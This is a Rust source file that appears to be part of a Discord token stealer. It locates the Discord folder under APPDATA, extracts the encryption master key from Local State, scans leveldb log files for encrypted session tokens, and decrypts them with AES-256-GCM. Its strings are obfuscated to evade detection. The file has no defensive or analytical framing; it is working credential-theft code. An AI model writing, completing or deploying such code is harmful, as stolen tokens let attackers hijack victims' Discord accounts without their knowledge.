#![allow(dead_code)]


use std::{
    path::PathBuf,
    collections::HashSet,
    fs::File,
    io::Read,
};

use anyhow::Result;

use crate::browser_util::*;

use regex::Regex;

use obfstr::obfstr;


pub fn capture_tokens_from_logs() -> Result<HashSet<String>> {

    let mut temp_buffer: Vec<u8> = vec![];

    let mut tokens: HashSet<String> = HashSet::new();


    let regex_discord = Regex::new(obfstr!(r#"dQw4w9WgXcQ:([^\"]*)"#)).unwrap();
    let roaming = std::env::var(obfstr!("APPDATA"))?;


    let mut temp_path: PathBuf = PathBuf::from(roaming + obfstr!("\\discord"));
    if temp_path.exists() {

        temp_path.push(obfstr!("Local State"));
        let key = get_master_key_from_Local_State(&temp_path)?;
        temp_path.pop();
        
        temp_path.push(obfstr!("Local Storage\\leveldb"));

        for entry in temp_path.read_dir()? {

            if let Ok(entry) = entry {

                let file_path = entry.path();

                if let Some(ext) = file_path.extension() {
                    if ext == "ldb" || ext == "log" {

                        temp_buffer.clear(); 
                        File::open(file_path)?.read_to_end(&mut temp_buffer)?; 
                        
                        let buffer = String::from_utf8_lossy(&temp_buffer);

                        for capture in regex_discord.captures_iter(&buffer) {

                            let raw = capture.get(1).unwrap(); 
                            let decoded_token: Vec<u8> = base64_light::base64_decode(raw.as_str()); 

                            let token = decrypt_aes256gcm(&decoded_token, &key)?;

                            tokens.insert(token);
                            
                        }
                    }
                }
            }
        }
    }

    Ok(tokens)
}